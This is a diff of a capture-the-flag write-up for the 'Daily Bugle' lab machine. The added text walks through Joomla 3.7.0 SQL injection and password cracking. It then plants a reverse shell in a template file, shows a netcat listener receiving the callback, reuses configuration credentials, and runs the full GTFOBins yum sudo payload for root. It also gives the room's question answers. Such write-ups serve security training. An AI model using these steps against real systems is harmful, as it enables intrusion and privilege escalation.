@@ -34,13 +34,13 @@ PORT     STATE SERVICE VERSION
 ```
 The Nmap Scan shows the ports are opened are ssh(22) , http(80) , mysql(3306).
 
-## Web Enumration (PORT 80)
+## Web Enumeration (PORT 80)
 
 <img width="1680" height="972" alt="Image" src="https://github.com/user-attachments/assets/24e9320b-948f-4cca-a056-5f1fe0406c75" />
 
 Question 1. Access the web server, who robbed the bank?
 
-Answer : spiderman
+Answer : ```spiderman```
 
 Explore The website source code and functionality were reviewed to understand the application workflow, followed by directory enumeration.
 
@@ -106,7 +106,7 @@ Intresting Directory ```/README.txt``` has been found.
 ```
 Question 2. What is the Joomla version?
 
-Answer : 3.7.0
+Answer : ```3.7.0```
 
 The readme.txt has the version ```Joomla! 3.7 version```
 
@@ -115,27 +115,13 @@ Another Interesting Directory ```/administrator``` has been found .
 
 <img width="1680" height="976" alt="Image" src="https://github.com/user-attachments/assets/2343e3e1-67b4-4a2f-847e-064c9c157e89" />
 
-Now we know the Joomala CMS 3.7.0 running so seach the exploit in the Google as we find the exploit in the [ExploitDB](https://www.exploit-db.com/exploits/42033)
+“Since Joomla CMS version 3.7.0 was identified, known public exploits were researched. as we find the exploit in the [ExploitDB](https://www.exploit-db.com/exploits/42033)
 but author what us to try another method of python script so after a long search finally found the exploit of it in the github (https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py) Thanks @stefanlucas
 
-the exploit is the joomblah we run it ...
+joomblah exploit was used to validate the SQL injection vulnerability 
 
 ```
 python3 joomblah.py http://<ip_addresss>
-                                                                                                                    
-    .---.    .-'''-.        .-'''-.                                                           
-    |   |   '   _    \     '   _    \                            .---.                        
-    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
-    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
-    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
-    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
-    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
-    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
-    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
-    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
- __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
-|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
-|____.'                                                                `--'  `" '---'   '---' 
 
  [-] Fetching CSRF token
  [-] Testing SQLi
@@ -162,4 +148,196 @@ spiderman123     (?)
 Session completed. 
 ```
 
-the Password Cracked ```jonah``` : ```spiderman123```
+the Password wasa Cracked ```jonah``` : ```spiderman123```
+
+Question 3. What is Jonah's cracked password?
+
+Answer : ```spiderman123```
+
+## Exploitation
+
+Use the Credentials to Login the joomala login page 
+
+<img width="1680" height="973" alt="Image" src="https://github.com/user-attachments/assets/5f7a932d-d5d3-4539-9e49-9e8666d0ee47" />
+
+
+We get in to the Dashboard its the control panel of  Administrator(Jonah) now we have to get the Web shell so look for the files that can modify it with the reverse shell payload . Go to the Templates menu
+
+
+<img width="1680" height="973" alt="Image" src="https://github.com/user-attachments/assets/adf9ced2-549c-49c9-9a0e-004f32542e72" />
+
+
+Select the template of it i selected the protostar template because its runs as the default in it 
+
+
+<img width="1680" height="976" alt="Image" src="https://github.com/user-attachments/assets/d41ad93c-c663-4724-a3c2-95b6da81e50e" />
+
+
+Now we modify the file error.php with the Reverse shell payload [REVSHELL](https://www.revshells.com/) on the terminal start the netcat listener ```nc -lnvp 9001```
+and save the file then Trigger the file to get the Shell.
+
+
+
+<img width="1680" height="134" alt="Image" src="https://github.com/user-attachments/assets/a19381ce-b2c8-47ba-8383-baabd59447f4" />
+
+Got the WEB Shell ✨
+
+```
+
+nc -lnvp 9001   
+listening on [any] 9001 ...
+connect to [192.168.150.101] from (UNKNOWN) [10.66.183.12] 39420
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 09:50:13 up 36 min,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ whoami
+whoami
+apache
+sh-4.2$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+sh: python3: command not found
+```
+We got the Apache Web shell and we don't have the python in this system so we cannot use the pty to spawn the shell
+```
+sh-4.2$ cd /home
+cd /home
+sh-4.2$ ls
+ls
+jjameson
+sh-4.2$ cd jjameson
+cd jjameson
+sh: cd: jjameson: Permission denied
+```
+we see the directory jjameson but we do not have the permission for accessing that folder so we have to escalute on the CMS service we have the configuration file that have the password for it . if there any chance the user reuses the password we can take over it ...
+```
+sh-4.2$ cd /var/www/html
+cd /var/www/html
+sh-4.2$ ls -al
+ls -al
+total 64
+drwxr-xr-x. 17 apache apache  4096 Dec 14  2019 .
+drwxr-xr-x.  4 root   root      33 Dec 14  2019 ..
+-rwxr-xr-x.  1 apache apache 18092 Apr 25  2017 LICENSE.txt
+-rwxr-xr-x.  1 apache apache  4494 Apr 25  2017 README.txt
+drwxr-xr-x. 11 apache apache   159 Apr 25  2017 administrator
+drwxr-xr-x.  2 apache apache    44 Apr 25  2017 bin
+drwxr-xr-x.  2 apache apache    24 Apr 25  2017 cache
+drwxr-xr-x.  2 apache apache   119 Apr 25  2017 cli
+drwxr-xr-x. 19 apache apache  4096 Apr 25  2017 components
+-rw-r--r--   1 apache apache  1982 Dec 14  2019 configuration.php
+-rwxr-xr-x.  1 apache apache  3005 Apr 25  2017 htaccess.txt
+drwxr-xr-x.  5 apache apache   164 Dec 15  2019 images
+drwxr-xr-x.  2 apache apache    64 Apr 25  2017 includes
+-rwxr-xr-x.  1 apache apache  1420 Apr 25  2017 index.php
+drwxr-xr-x.  4 apache apache    54 Apr 25  2017 language
+drwxr-xr-x.  5 apache apache    70 Apr 25  2017 layouts
+drwxr-xr-x. 11 apache apache   255 Apr 25  2017 libraries
+drwxr-xr-x. 26 apache apache  4096 Apr 25  2017 media
+drwxr-xr-x. 27 apache apache  4096 Apr 25  2017 modules
+drwxr-xr-x. 16 apache apache   250 Apr 25  2017 plugins
+-rwxr-xr-x.  1 apache apache   836 Apr 25  2017 robots.txt
+drwxr-xr-x.  5 apache apache    68 Dec 15  2019 templates
+drwxr-xr-x.  2 apache apache    24 Dec 15  2019 tmp
+-rwxr-xr-x.  1 apache apache  1690 Apr 25  2017 web.config.txt
+sh-4.2$ cat configuration.php
+cat configuration.php
+<?php
+class JConfig {
+        public $offline = '0';
+        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+        public $display_offline_message = '1';
+        public $offline_image = '';
+        public $sitename = 'The Daily Bugle';
+        public $editor = 'tinymce';
+        public $captcha = '0';
+        public $list_limit = '20';
+        public $access = '1';
+        public $debug = '0';
+        public $debug_lang = '0';
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'root';
+        public $password = 'nv5#############';
+        public $db = 'joomla';
+        public $dbprefix = 'fb9j5_';
+        public $live_site = '';
+        public $secret = 'UAMBRWzHO3oFPmVC';
+       ...........
+}sh-4.2$ su root
+su root
+Password: nv5#############
+su: Authentication failure
+sh-4.2$ su jjameson
+su jjameson
+Password: nv5#############
+```
+We got the jjameson User Shell This confirmed credential reuse between the Joomla database and system users.
+```
+sh-4.2$ cd /home
+ls
+jjameson
+sh-4.2$ cd jjameson
+sh-4.2$ ls
+user.txt
+sh-4.2$ cat user.txt
+27a#############################
+```
+We Got the User.txt ✨
+
+After the Web shell escalute the permissions to the User Shell jjameson . Now We do the Privilege escalation to Root access 
+## Privilege Escalation
+
+```
+sh-4.2$ sudo -l
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+```
+The command ```sudo -l``` list the service which have the root access to excute with this we use the [GFTOBin](https://gtfobins.github.io/) website and search for the ```yum``` and get the payload to get the root shell 
+
+Execute the payload to get the local user to root access shell
+```
+sh-4.2$ TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# whoami
+root
+sh-4.2# cd /root
+ls
+anaconda-ks.cfg
+root.txt
+sh-4.2# cat root.txt
+eec#############################
+```
+After We got the Root Access and Root.txt Successfully 🔥💥
+
+<img width="900" height="338" alt="Image" src="https://github.com/user-attachments/assets/58ac9c48-c459-45be-876a-3b4ef8c019a5" />
+
+
+
